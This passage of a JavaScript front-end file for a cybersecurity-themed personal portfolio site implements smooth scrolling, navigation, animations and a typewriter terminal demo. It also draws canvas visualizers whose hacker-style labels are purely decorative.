/* ========================================================
   IQ MAXX — main.js
   Cinematic 3D Hero Scene (Three.js), Lenis Smooth Scroll,
   6 Live Procedural Gallery Canvas Visualizers,
   Interactive 3D Tilt, Scroll Reveals, Terminal Demo
   ======================================================== */

import * as THREE from 'three';
import Lenis from 'lenis';

/* ─── DOM Helpers & Environment ──────────────────────────── */
const $ = (sel, ctx = document) => ctx.querySelector(sel);
const $$ = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));

const clamp = (v, min, max) => Math.max(min, Math.min(max, v));
const lerp = (a, b, t) => a + (b - a) * t;
const prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

/* ─── Lenis Smooth Scroll ────────────────────────────────── */
let lenisInstance = null;

function initLenis() {
  if (prefersReduced) return;

  try {
    lenisInstance = new Lenis({
      duration: 1.25,
      easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
      orientation: 'vertical',
      gestureOrientation: 'vertical',
      smoothWheel: true,
      smoothTouch: false,
      wheelMultiplier: 1.0,
      touchMultiplier: 1.5,
    });

    function raf(time) {
      lenisInstance.raf(time);
      requestAnimationFrame(raf);
    }
    requestAnimationFrame(raf);

    // Smooth scroll for anchor links
    $$('a[href^="#"]').forEach((anchor) => {
      anchor.addEventListener('click', (e) => {
        const href = anchor.getAttribute('href');
        if (!href || href === '#') return;
        const target = $(href);
        if (target) {
          e.preventDefault();
          lenisInstance.scrollTo(target, {
            offset: -70,
            duration: 1.3,
            easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
          });
        }
      });
    });
  } catch (err) {
    console.warn('Lenis initialization fallback:', err);
  }
}

/* ─── Navigation & Active Scroll Spy ─────────────────────── */
function initNav() {
  const nav = $('#nav');
  const navToggle = $('#nav-toggle');
  const navMobile = $('#nav-mobile');

  const onScroll = () => {
    const y = lenisInstance ? lenisInstance.scroll : window.scrollY;
    if (nav) nav.classList.toggle('scrolled', y > 30);
  };

  if (lenisInstance) {
    lenisInstance.on('scroll', onScroll);
  } else {
    window.addEventListener('scroll', onScroll, { passive: true });
  }
  onScroll();

  if (navToggle && navMobile) {
    navToggle.addEventListener('click', () => {
      const isOpen = navMobile.classList.toggle('open');
      navToggle.classList.toggle('active', isOpen);
      navToggle.setAttribute('aria-expanded', String(isOpen));
    });

    $$('#nav-mobile a').forEach((a) => {
      a.addEventListener('click', () => {
        navMobile.classList.remove('open');
        navToggle.classList.remove('active');
        navToggle.setAttribute('aria-expanded', 'false');
      });
    });
  }

  // Active section scroll spy
  const sections = $$('section[id]');
  const navLinks = $$('.nav-menu a, #nav-mobile a');

  function updateActiveNav() {
    const scrollY = (lenisInstance ? lenisInstance.scroll : window.scrollY) + 140;
    sections.forEach((sec) => {
      const top = sec.offsetTop;
      const height = sec.offsetHeight;
      const id = sec.getAttribute('id');
      if (scrollY >= top && scrollY < top + height) {
        navLinks.forEach((link) => {
          link.classList.toggle('active', link.getAttribute('href') === `#${id}`);
        });
      }
    });
  }

  if (lenisInstance) {
    lenisInstance.on('scroll', updateActiveNav);
  } else {
    window.addEventListener('scroll', updateActiveNav, { passive: true });
  }
  updateActiveNav();
}

/* ─── Scroll Reveal System ───────────────────────────────── */
function initScrollReveal() {
  const revealElements = $$('.reveal');

  if (prefersReduced) {
    revealElements.forEach((el) => el.classList.add('visible'));
    return;
  }

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          observer.unobserve(entry.target);
        }
      });
    },
    {
      threshold: 0.1,
      rootMargin: '0px 0px -40px 0px',
    }
  );

  revealElements.forEach((el) => observer.observe(el));
}

/* ─── Animated Number Counters ───────────────────────────── */
function initCounters() {
  const countElements = $$('[data-count]');

  if (prefersReduced) {
    countElements.forEach((el) => {
      el.textContent = el.getAttribute('data-count');
    });
    return;
  }

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const el = entry.target;
          const target = parseInt(el.getAttribute('data-count'), 10) || 0;
          animateCount(el, 0, target, 1600);
          observer.unobserve(el);
        }
      });
    },
    { threshold: 0.4 }
  );

  countElements.forEach((el) => observer.observe(el));

  function animateCount(el, from, to, duration) {
    const start = performance.now();
    function tick(now) {
      const t = clamp((now - start) / duration, 0, 1);
      const ease = 1 - Math.pow(1 - t, 3);
      el.textContent = Math.round(from + (to - from) * ease).toString();
      if (t < 1) requestAnimationFrame(tick);
      else el.textContent = to.toString();
    }
    requestAnimationFrame(tick);
  }
}

/* ─── Founder Skill Bars ─────────────────────────────────── */
function initSkillBars() {
  const skillFills = $$('.skill-fill');

  if (prefersReduced) {
    skillFills.forEach((el) => {
      el.style.width = el.getAttribute('data-width') + '%';
      el.classList.add('animated');
    });
    return;
  }

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const fill = entry.target;
          const w = fill.getAttribute('data-width') || '0';
          fill.style.setProperty('--w', `${w}%`);
          fill.classList.add('animated');
          observer.unobserve(fill);
        }
      });
    },
    { threshold: 0.3 }
  );

  skillFills.forEach((el) => observer.observe(el));
}

/* ─── Timeline Process Laser Conduit ─────────────────────── */
function initTimeline() {
  const timeline = $('#timeline');
  const conduit = $('.timeline-laser-conduit');
  if (!timeline || !conduit) return;

  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          conduit.classList.add('active');
          observer.unobserve(timeline);
        }
      });
    },
    { threshold: 0.2 }
  );

  observer.observe(timeline);
}

/* ─── 3D Card Tilt ───────────────────────────────────────── */
function initCardTilt() {
  if (prefersReduced || window.matchMedia('(pointer: coarse)').matches) return;

  const tiltCards = $$('.gallery-card, .about-card, .service-card, .security-card');

  tiltCards.forEach((card) => {
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = (e.clientX - rect.left) / rect.width;
      const y = (e.clientY - rect.top) / rect.height;

      const rotX = (y - 0.5) * -6;
      const rotY = (x - 0.5) * 6;
      card.style.transform = `perspective(800px) rotateX(${rotX}deg) rotateY(${rotY}deg) translateY(-4px)`;
    });

    card.addEventListener('mouseleave', () => {
      card.style.transform = '';
    });
  });
}


/* ─── High-Tech Cyber Text Decipher / Scramble Glitch ─────── */
function initCyberTextScramble() {
  if (prefersReduced) return;

  const GLYPHS = '0123456789ABCDEF_/$#@!%&*<>[]{}~+=-';

  const scrambleElements = $$(
    '.btn, .nav-cta, .qual-badge, .gallery-action-btn, [data-scramble]'
  );

  scrambleElements.forEach((el) => {
    const targetSpan = el.querySelector('.btn-text') || el;
    const originalText = el.getAttribute('data-scramble') || targetSpan.textContent.trim();
    if (!originalText) return;

    let isScrambling = false;
    let animId = null;

    el.addEventListener('mouseenter', () => {
      if (isScrambling) return;
      isScrambling = true;

      const duration = 240;
      const startTime = performance.now();
      const len = originalText.length;

      function update(now) {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const lockedCount = Math.floor(progress * len);

        let output = '';
        for (let i = 0; i < len; i++) {
          if (i < lockedCount) {
            output += originalText[i];
          } else if (originalText[i] === ' ') {
            output += ' ';
          } else {
            output += GLYPHS[Math.floor(Math.random() * GLYPHS.length)];
          }
        }

        targetSpan.textContent = output;

        if (progress < 1) {
          animId = requestAnimationFrame(update);
        } else {
          targetSpan.textContent = originalText;
          isScrambling = false;
        }
      }

      cancelAnimationFrame(animId);
      animId = requestAnimationFrame(update);
    });

    el.addEventListener('mouseleave', () => {
      cancelAnimationFrame(animId);
      targetSpan.textContent = originalText;
      isScrambling = false;
    });
  });
}

/* ─── Dynamic Quantum Button Shockwave Ripples ───────────── */
function initButtonRipples() {
  const rippleTargets = $$('.btn, .nav-cta, .gallery-action-btn, .qual-badge, .term-reboot-btn');

  rippleTargets.forEach((btn) => {
    btn.addEventListener('click', (e) => {
      const rect = btn.getBoundingClientRect();
      const ripple = document.createElement('span');
      ripple.className = 'btn-ripple';

      const size = Math.max(rect.width, rect.height) * 2;
      ripple.style.width = `${size}px`;
      ripple.style.height = `${size}px`;
      ripple.style.left = `${e.clientX - rect.left}px`;
      ripple.style.top = `${e.clientY - rect.top}px`;

      btn.appendChild(ripple);

      setTimeout(() => {
        ripple.remove();
      }, 600);
    });
  });
}

/* ─── Interactive Terminal Controls & Typewriter Demo ────── */
let runTerminalSequence = null;

function initTerminal() {
  const termBody = $('#terminal-body');
  const termWindow = $('#terminal-window');
  const termClose = $('#term-close');
  const termMin = $('#term-min');
  const termMax = $('#term-max');
  const termReboot = $('#term-reboot');

  if (!termBody) return;

  const termSequence = [
    { type: 'cmd', text: 'iq-maxx --init --profile deepak', delay: 100 },
    { type: 'info', text: '[*] Initializing IQ MAXX Core Environment v2.6.4...', delay: 350 },
    { type: 'info', text: '[*] Verifying operating system: Debian GNU/Linux 12 (bookworm)', delay: 250 },
    { type: 'ok', text: '[✓] Python 3.12.3 & GCC 13.2.0 toolchain loaded', delay: 200 },
    { type: 'info', text: '[*] Mounting AI Offensive Cybersecurity toolkit...', delay: 300 },
    { type: 'ok', text: '[✓] Reconnaissance & OSINT modules armed', delay: 220 },
    { type: 'ok', text: '[✓] High-speed vulnerability scanner initialized', delay: 220 },
    { type: 'ok', text: '[✓] Interactive TUI engine & Terminal shaders active', delay: 220 },
    { type: 'ok', text: '[✓] Linux hardening & audit wrappers ready', delay: 200 },
    { type: 'info', text: '[▸] IQ MAXX ecosystem is ONLINE and armed.', delay: 300 },
    { type: 'cmd', text: 'whoami', delay: 400 },
    { type: 'info', text: '▸ Deepak Kumar.S — Cyber Security & Offensive Tool Developer', delay: 250 },
    { type: 'prompt', text: 'iq-maxx ~/security $ ', delay: 200 }
  ];

  let isRunning = false;

  async function typeWriter(lineEl, text, speed = 20) {
    for (let i = 0; i <= text.length; i++) {
      lineEl.textContent = text.slice(0, i);
      termBody.scrollTop = termBody.scrollHeight;
      await new Promise((r) => setTimeout(r, speed + Math.random() * 8));
    }
  }

  async function startSequence() {
    if (isRunning) return;
    isRunning = true;
    termBody.innerHTML = '';

    for (const item of termSequence) {
      await new Promise((r) => setTimeout(r, item.delay || 150));

      const line = document.createElement('div');
      line.className = 'terminal-line';

      if (item.type === 'cmd') {
        line.innerHTML = '<span class="tok-prompt">iq-maxx</span><span class="tok-path"> ~/ </span><span class="tok-cmd">$ </span><span class="tok-flag"></span>';
        const flagSpan = line.querySelector('.tok-flag');
        termBody.appendChild(line);
        line.classList.add('show');
        await typeWriter(flagSpan, item.text, 24);
      } else if (item.type === 'ok') {
        line.innerHTML = `<span class="tok-ok">${item.text}</span>`;
        termBody.appendChild(line);
        line.classList.add('show');
      } else if (item.type === 'info') {
        line.innerHTML = `<span class="tok-info">${item.text}</span>`;
        termBody.appendChild(line);
        line.classList.add('show');
      } else if (item.type === 'prompt') {
        line.innerHTML = `<span class="tok-prompt">iq-maxx</span><span class="tok-path"> ~/security </span><span class="tok-cmd">$ </span><span class="term-cursor"></span>`;
        termBody.appendChild(line);
        line.classList.add('show');
      }
      termBody.scrollTop = termBody.scrollHeight;
    }
    isRunning = false;
  }

  runTerminalSequence = startSequence;

  let started = false;
  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting && !started) {
          started = true;
          startSequence();
          observer.disconnect();
        }
      });
    },
    { threshold: 0.3 }
  );

  observer.observe(termBody);

  // Terminal Window Control Buttons
  if (termClose && termBody && termReboot) {
    termClose.addEventListener('click', () => {
      termBody.style.opacity = '0';
      termBody.style.pointerEvents = 'none';
      termReboot.style.display = 'inline-flex';
    });

    termReboot.addEventListener('click', () => {
      termBody.style.opacity = '1';
      termBody.style.pointerEvents = '';
      termReboot.style.display = 'none';
      startSequence();
    });
  }

  if (termMin && termWindow) {
    termMin.addEventListener('click', () => {
      termWindow.classList.toggle('minimized');
    });
  }

  if (termMax && termWindow) {
    termMax.addEventListener('click', () => {
      termWindow.classList.toggle('maximized');
    });
  }
}

/* ─── Founder Dual Morphing Box Shutter Slider ───────────── */
function initMorphingBoxes() {
  const morphBox1 = $('#morph-box-1');
  if (!morphBox1) return;

  const text1 = morphBox1.querySelector('.morph-text--1');
  const text2 = morphBox1.querySelector('.morph-text--2');
  if (!text1 || !text2) return;

  let isShowingFirst = true;

  function cycleShutter() {
    // 1. Slide shutters in from left and right to close the box
    morphBox1.classList.add('shutters-closed');

    // 2. Midpoint when shutters are closed: swap active text
    setTimeout(() => {
      if (isShowingFirst) {
        text1.classList.remove('active');
        text2.classList.add('active');
        isShowingFirst = false;
      } else {
        text2.classList.remove('active');
        text1.classList.add('active');
        isShowingFirst = true;
      }

      // 3. Open shutters revealing the new text
      setTimeout(() => {
        morphBox1.classList.remove('shutters-closed');
      }, 100);
    }, 340);
  }

  // Exact 1.5s display hold cycle as requested
  setInterval(cycleShutter, 2280);
}

/* ─── Founder Photo Interactive VFX & Touch Flash ────────── */
function initFounderPhotoVFX() {
  const stage = $('#founder-photo-stage');
  const flash = $('#photo-vfx-flash');
  const imgWrap = stage ? stage.querySelector('.photo-vfx-img-wrap') : null;
  const matrix = stage ? stage.querySelector('.photo-vfx-matrix') : null;

  if (!stage) return;

  // Interactive 3D Perspective Tilt on Mouse Movement
  if (!prefersReduced && !window.matchMedia('(pointer: coarse)').matches) {
    stage.addEventListener('mousemove', (e) => {
      const rect = stage.getBoundingClientRect();
      const x = (e.clientX - rect.left) / rect.width - 0.5;
      const y = (e.clientY - rect.top) / rect.height - 0.5;

      const rotX = y * -14;
      const rotY = x * 14;

      if (imgWrap) {
        imgWrap.style.transform = `perspective(600px) rotateX(${rotX}deg) rotateY(${rotY}deg) translateZ(12px)`;
      }
      if (matrix) {
        matrix.style.transform = `perspective(600px) rotateX(${rotX * 0.5}deg) rotateY(${rotY * 0.5}deg) scale(1.02)`;
      }
    });

    stage.addEventListener('mouseleave', () => {
      if (imgWrap) imgWrap.style.transform = '';
      if (matrix) matrix.style.transform = '';
    });
  }

  // Interactive Touch / Click Electric Flash VFX
  function triggerPhotoFlash() {
    if (!flash) return;
    flash.classList.remove('active');
    // Force reflow
    void flash.offsetWidth;
    flash.classList.add('active');

    setTimeout(() => {
      flash.classList.remove('active');
    }, 450);
  }

  stage.addEventListener('click', triggerPhotoFlash);
  stage.addEventListener('touchstart', triggerPhotoFlash, { passive: true });
}

/* ─── Interactive Gallery Action Buttons ─────────────────── */
function initGalleryInteractiveButtons(galleryManager) {
  const actionBtns = $$('.gallery-action-btn');

  actionBtns.forEach((btn) => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const engineType = btn.dataset.engine;
      if (galleryManager && engineType) {
        galleryManager.triggerPulse(engineType);
      }

      const textSpan = btn.querySelector('.btn-text');
      if (textSpan) {
        const prevText = textSpan.textContent;
        textSpan.textContent = 'PULSE ACTIVE!';
        setTimeout(() => {
          textSpan.textContent = prevText;
        }, 900);
      }
    });
  });
}

/* ========================================================
   GALLERY PROCEDURAL VIDEO-LIKE VISUALIZERS (6 CANVASES)
   High-performance, 60fps real-time procedural animations
   ======================================================== */

class GalleryVisualizerManager {
  constructor() {
    this.engines = new Map();
    this.initObserver();
  }

  triggerPulse(type) {
    const engine = this.engines.get(type);
    if (engine && typeof engine.pulse === 'function') {
      engine.pulse();
    }
  }

  initObserver() {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          const card = entry.target;
          const engineType = card.dataset.engine;
          const engine = this.engines.get(engineType);
          if (engine) {
            engine.setActive(entry.isIntersecting);
          }
        });
      },
      { threshold: 0.1 }
    );

    $$('.gallery-card[data-engine]').forEach((card) => {
      const type = card.dataset.engine;
      const canvas = card.querySelector('.gallery-canvas');
      if (canvas) {
        const engine = this.createEngine(type, canvas, card);
        if (engine) {
          this.engines.set(type, engine);
          observer.observe(card);
        }
      }
    });
  }

  createEngine(type, canvas, card) {
    switch (type) {
      case 'cyber-core':
        return new CyberCoreEngine(canvas, card);
      case 'tui-dashboard':
        return new TuiDashboardEngine(canvas, card);
      case 'network-radar':
        return new NetworkRadarEngine(canvas, card);
      case 'bug-bounty':
        return new BugBountyEngine(canvas, card);
      case 'linux-shield':
        return new LinuxShieldEngine(canvas, card);
      case 'kinetic-waves':
        return new KineticWavesEngine(canvas, card);
      default:
        return null;
    }
  }
}

/* Base Canvas Engine */
class BaseCanvasEngine {
  constructor(canvas, card) {
    this.canvas = canvas;
    this.card = card;
    this.ctx = canvas.getContext('2d');
    this.active = false;
    this.time = 0;
    this.pulseEnergy = 0;
    this.dpr = Math.min(window.devicePixelRatio || 1, 2);
    this.hovered = false;

    this.resize();
    window.addEventListener('resize', () => this.resize(), { passive: true });

    this.card.addEventListener('mouseenter', () => { this.hovered = true; });
    this.card.addEventListener('mouseleave', () => { this.hovered = false; });
  }

  pulse() {
    this.pulseEnergy = 1.0;
  }

  resize() {
    const rect = this.canvas.getBoundingClientRect();
    if (rect.width === 0 || rect.height === 0) return;
    this.width = rect.width;
    this.height = rect.height;
    this.canvas.width = this.width * this.dpr;
    this.canvas.height = this.height * this.dpr;
    this.ctx.scale(this.dpr, this.dpr);
  }

  setActive(isActive) {
    this.active = isActive;
    if (isActive) {
      this.resize();
      this.lastTime = performance.now();
      requestAnimationFrame((t) => this.loop(t));
    }
  }

  loop(now) {
    if (!this.active) return;
    const dt = Math.min((now - (this.lastTime || now)) / 1000, 0.05);
    this.lastTime = now;
    if (this.pulseEnergy > 0) {
      this.pulseEnergy = Math.max(0, this.pulseEnergy - dt * 2.0);
    }
    this.time += dt * (this.hovered || this.pulseEnergy > 0 ? 1.7 : 1.0);

    this.ctx.clearRect(0, 0, this.width, this.height);
    this.draw(dt);

    if (this.pulseEnergy > 0) {
      this.ctx.save();
      this.ctx.strokeStyle = `rgba(62, 230, 255, ${this.pulseEnergy * 0.45})`;
      this.ctx.lineWidth = 2;
      this.ctx.strokeRect(2, 2, this.width - 4, this.height - 4);
      this.ctx.restore();
    }

    requestAnimationFrame((t) => this.loop(t));
  }

  draw() {}
}

/* 1. Cyber Core Interface Engine */
class CyberCoreEngine extends BaseCanvasEngine {
  draw() {
    const { ctx, width, height, time } = this;
    const cx = width / 2;
    const cy = height / 2;

    // Subtle dark grid
    ctx.strokeStyle = 'rgba(124, 196, 255, 0.04)';
    ctx.lineWidth = 1;
    const step = 28;
    for (let x = 0; x < width; x += step) {
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, height);
      ctx.stroke();
    }
    for (let y = 0; y < height; y += step) {
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(width, y);
      ctx.stroke();
    }

    // Matrix hex data stream
    ctx.font = '9px "JetBrains Mono", monospace';
    ctx.fillStyle = 'rgba(124, 196, 255, 0.16)';
    const hexChars = ['0x4F', '0x9A', '0x1C', '0xFF', '0x7E', '0x3B', '0x88', '0x2D'];
    for (let col = 0; col < 6; col++) {
      const x = 20 + col * ((width - 40) / 5);
      const yOffset = (time * 50 + col * 45) % height;
      const char = hexChars[(col + Math.floor(time * 3)) % hexChars.length];
      ctx.fillText(char, x, yOffset);
    }

    // Rotating HUD Reticle Rings
    const radius = Math.min(width, height) * 0.28;

    ctx.save();
    ctx.translate(cx, cy);
    ctx.rotate(time * 0.35);

    ctx.strokeStyle = 'rgba(62, 230, 255, 0.35)';
    ctx.lineWidth = 1.2;
    ctx.beginPath();
    ctx.arc(0, 0, radius, 0, Math.PI * 2);
    ctx.stroke();

    for (let i = 0; i < 24; i++) {
      const angle = (Math.PI / 12) * i;
      const len = i % 4 === 0 ? 6 : 3;
      ctx.beginPath();
      ctx.moveTo(Math.cos(angle) * (radius - len), Math.sin(angle) * (radius - len));
      ctx.lineTo(Math.cos(angle) * (radius + len), Math.sin(angle) * (radius + len));
      ctx.stroke();
    }
    ctx.restore();

    ctx.save();
    ctx.translate(cx, cy);
    ctx.rotate(-time * 0.5);

    ctx.strokeStyle = 'rgba(124, 196, 255, 0.6)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.75, 0, Math.PI * 0.8);
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(0, 0, radius * 0.75, Math.PI, Math.PI * 1.8);
    ctx.stroke();
    ctx.restore();

    // Central crosshair
    ctx.save();
    ctx.translate(cx, cy);
    ctx.strokeStyle = '#3ee6ff';
    ctx.lineWidth = 1.2;
    ctx.strokeRect(-14, -14, 28, 28);

    ctx.beginPath();
    ctx.moveTo(-24, 0); ctx.lineTo(-15, 0);
    ctx.moveTo(15, 0); ctx.lineTo(24, 0);
    ctx.moveTo(0, -24); ctx.lineTo(0, -15);
    ctx.moveTo(0, 15); ctx.lineTo(0, 24);
    ctx.stroke();

    ctx.fillStyle = '#fff';
    ctx.beginPath();
    ctx.arc(0, 0, 2.5, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    // Audio waveform
    ctx.strokeStyle = 'rgba(62, 230, 255, 0.4)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    const waveY = height - 24;
    for (let x = 20; x < width - 20; x += 4) {
      const freq = Math.sin(x * 0.06 + time * 5) * Math.cos(x * 0.03 + time * 2.5) * 8;
      if (x === 20) ctx.moveTo(x, waveY + freq);
      else ctx.lineTo(x, waveY + freq);
    }
    ctx.stroke();
  }
}

/* 2. TUI Dashboard Engine */
class TuiDashboardEngine extends BaseCanvasEngine {
  draw() {
    const { ctx, width, height, time } = this;

    ctx.fillStyle = '#040914';
    ctx.fillRect(0, 0, width, height);

    ctx.font = '9.5px "JetBrains Mono", monospace';

    // Sparkline box
    ctx.fillStyle = 'rgba(124, 196, 255, 0.05)';
    ctx.fillRect(16, 16, width - 32, 50);
    ctx.strokeStyle = 'rgba(124, 196, 255, 0.12)';
    ctx.strokeRect(16, 16, width - 32, 50);

    ctx.strokeStyle = 'rgba(62, 230, 255, 0.7)';
    ctx.lineWidth = 1.2;
    ctx.beginPath();
    for (let x = 16; x < width - 16; x += 4) {
      const y = 42 + Math.sin((x + time * 70) * 0.05) * 12 + Math.sin(x * 0.1 + time * 2) * 5;
      if (x === 16) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.stroke();

    ctx.fillStyle = '#8aa0be';
    ctx.fillText('RAM: [██████████░░░░░] 68.4% · SWAP: 12%', 20, 84);

    ctx.fillStyle = '#7cc4ff';
    ctx.fillText('PID   USER     CPU%   MEM%   CMD', 20, 106);
    ctx.strokeStyle = 'rgba(124, 196, 255, 0.1)';
    ctx.beginPath();
    ctx.moveTo(20, 110); ctx.lineTo(width - 20, 110);
    ctx.stroke();

    const procs = [
      { pid: '104', user: 'deepak', cpu: (14.2 + Math.sin(time * 3) * 1.5).toFixed(1), mem: '3.4', cmd: 'iq-tui-daemon' },
      { pid: '219', user: 'root',   cpu: (8.4 + Math.cos(time * 2) * 0.8).toFixed(1),  mem: '2.1', cmd: 'net-analyzer' },
      { pid: '340', user: 'deepak', cpu: (4.1 + Math.sin(time * 5) * 0.6).toFixed(1),  mem: '1.2', cmd: 'vuln-scanner' },
      { pid: '412', user: 'system', cpu: '1.2', mem: '0.8', cmd: 'linux-audit' },
      { pid: '588', user: 'deepak', cpu: '0.6', mem: '0.4', cmd: 'ssh-tunnel' },
    ];

    procs.forEach((p, idx) => {
      const y = 124 + idx * 15;
      if (y > height - 16) return;
      ctx.fillStyle = idx === 0 ? '#7cc4ff' : '#cbd8e6';
      ctx.fillText(`${p.pid.padEnd(5)} ${p.user.padEnd(8)} ${p.cpu.padStart(5)}% ${p.mem.padStart(5)}%  ${p.cmd}`, 20, y);
    });

    const gridCols = Math.floor((width - 40) / 12);
    for (let c = 0; c < gridCols; c++) {
      const isFilled = ((c * 7 + Math.floor(time * 3)) % 5) !== 0;
      ctx.fillStyle = isFilled ? 'rgba(62, 230, 255, 0.45)' : 'rgba(124, 196, 255, 0.08)';
      ctx.fillRect(20 + c * 12, height - 16, 8, 6);
    }
  }
}

/* 3. Network Radar Scanner Engine */
class NetworkRadarEngine extends BaseCanvasEngine {
  constructor(canvas, card) {
    super(canvas, card);
    this.hosts = [];
    for (let i = 0; i < 14; i++) {
      const angle = Math.random() * Math.PI * 2;
      const dist = 0.2 + Math.random() * 0.65;
      this.hosts.push({ angle, dist, ip: `192.168.1.${10 + i}`, port: [22, 80, 443, 8080][i % 4] });
    }
  }

  draw() {
    const { ctx, width, height, time } = this;
    const cx = width / 2;
    const cy = height / 2;
    const maxRadius = Math.min(width, height) * 0.42;

    ctx.fillStyle = '#030814';
    ctx.fillRect(0, 0, width, height);

    ctx.lineWidth = 1;
    [0.33, 0.66, 1.0].forEach((ratio) => {
      ctx.strokeStyle = 'rgba(62, 230, 255, 0.12)';
      ctx.beginPath();
      ctx.arc(cx, cy, maxRadius * ratio, 0, Math.PI * 2);
      ctx.stroke();
    });

    ctx.strokeStyle = 'rgba(62, 230, 255, 0.08)';
    ctx.beginPath();
    ctx.moveTo(cx - maxRadius, cy); ctx.lineTo(cx + maxRadius, cy);
    ctx.moveTo(cx, cy - maxRadius); ctx.lineTo(cx + maxRadius, cy);
    ctx.stroke();

    const sweepAngle = (time * 1.6) % (Math.PI * 2);

    ctx.save();
    ctx.translate(cx, cy);
    const grad = ctx.createRadialGradient(0, 0, 0, 0, 0, maxRadius);
    grad.addColorStop(0, 'rgba(62, 230, 255, 0.25)');
    grad.addColorStop(1, 'rgba(62, 230, 255, 0.0)');

    ctx.fillStyle = grad;
    ctx.beginPath();
    ctx.moveTo(0, 0);
    ctx.arc(0, 0, maxRadius, sweepAngle - 0.35, sweepAngle);
    ctx.closePath();
    ctx.fill();

    ctx.strokeStyle = 'rgba(62, 230, 255, 0.8)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.moveTo(0, 0);
    ctx.lineTo(Math.cos(sweepAngle) * maxRadius, Math.sin(sweepAngle) * maxRadius);
    ctx.stroke();
    ctx.restore();

    this.hosts.forEach((h) => {
      const hx = cx + Math.cos(h.angle) * (maxRadius * h.dist);
      const hy = cy + Math.sin(h.angle) * (maxRadius * h.dist);

      let diff = (sweepAngle - h.angle) % (Math.PI * 2);
      if (diff < 0) diff += Math.PI * 2;
      const isLit = diff < 0.7;
      const alpha = isLit ? (1 - diff / 0.7) : 0.15;

      ctx.fillStyle = `rgba(62, 230, 255, ${alpha * 0.85})`;
      ctx.beginPath();
      ctx.arc(hx, hy, isLit ? 3.5 : 2, 0, Math.PI * 2);
      ctx.fill();

      if (isLit) {
        ctx.font = '8.5px "JetBrains Mono", monospace';
        ctx.fillStyle = '#e2eaf4';
        ctx.fillText(`:${h.port}`, hx + 6, hy + 3);
      }
    });
  }
}

/* 4. Bug Bounty Recon Tree Engine */
class BugBountyEngine extends BaseCanvasEngine {
  constructor(canvas, card) {
    super(canvas, card);
    this.nodes = [
      { id: 'ROOT', label: 'target.io', x: 0.15, y: 0.5, status: '200' },
      { id: 'API', label: 'api.target', x: 0.45, y: 0.25, status: '200' },
      { id: 'AUTH', label: 'auth.target', x: 0.45, y: 0.75, status: '302' },
      { id: 'V1', label: '/v1/users', x: 0.78, y: 0.15, status: '200' },
      { id: 'DEV', label: 'dev-api', x: 0.78, y: 0.38, status: 'VULN' },
      { id: 'OAUTH', label: '/oauth/token', x: 0.78, y: 0.65, status: '403' },
      { id: 'ADMIN', label: 'admin.target', x: 0.78, y: 0.88, status: '200' },
    ];
    this.links = [
      [0, 1], [0, 2], [1, 3], [1, 4], [2, 5], [2, 6]
    ];
  }

  draw() {
    const { ctx, width, height, time } = this;

    ctx.fillStyle = '#030712';
    ctx.fillRect(0, 0, width, height);

    this.links.forEach(([aIdx, bIdx], linkI) => {
      const a = this.nodes[aIdx];
      const b = this.nodes[bIdx];
      const ax = a.x * width; const ay = a.y * height;
      const bx = b.x * width; const by = b.y * height;

      ctx.strokeStyle = 'rgba(124, 196, 255, 0.14)';
      ctx.lineWidth = 1.2;
      ctx.beginPath();
      ctx.moveTo(ax, ay);
      ctx.bezierCurveTo((ax + bx) / 2, ay, (ax + bx) / 2, by, bx, by);
      ctx.stroke();

      const crawl = (time * 0.7 + linkI * 0.25) % 1;
      const px = ax + (bx - ax) * crawl;
      const py = ay + (by - ay) * crawl;
      ctx.fillStyle = '#7cc4ff';
      ctx.beginPath();
      ctx.arc(px, py, 2.5, 0, Math.PI * 2);
      ctx.fill();
    });

    this.nodes.forEach((n) => {
      const nx = n.x * width;
      const ny = n.y * height;
      const isVuln = n.status === 'VULN';

      ctx.fillStyle = isVuln ? 'rgba(255, 95, 86, 0.12)' : 'rgba(7, 17, 32, 0.85)';
      ctx.strokeStyle = isVuln ? '#ff5f56' : 'rgba(124, 196, 255, 0.4)';
      ctx.lineWidth = 1;

      ctx.beginPath();
      ctx.roundRect(nx - 34, ny - 11, 68, 22, 5);
      ctx.fill();
      ctx.stroke();

      ctx.font = '8.5px "JetBrains Mono", monospace';
      ctx.fillStyle = isVuln ? '#ff5f56' : '#e2eaf4';
      ctx.textAlign = 'center';
      ctx.fillText(n.label, nx, ny + 3);
      ctx.textAlign = 'left';
    });
  }
}

/* 5. Linux Shield Matrix Engine */
class LinuxShieldEngine extends BaseCanvasEngine {
  draw() {
    const { ctx, width, height, time } = this;
    const cx = width / 2;
    const cy = height / 2;

    ctx.fillStyle = '#030814';
    ctx.fillRect(0, 0, width, height);

    const hexSize = 22;
    const h = hexSize * Math.sqrt(3);
    for (let r = -2; r <= 2; r++) {
      for (let q = -3; q <= 3; q++) {
        const hx = cx + q * (hexSize * 1.5);
        const hy = cy + r * h + (q % 2 !== 0 ? h / 2 : 0);

        const dist = Math.hypot(hx - cx, hy - cy);
        if (dist > 90) continue;

        const pulse = Math.sin(time * 2.5 - dist * 0.05);
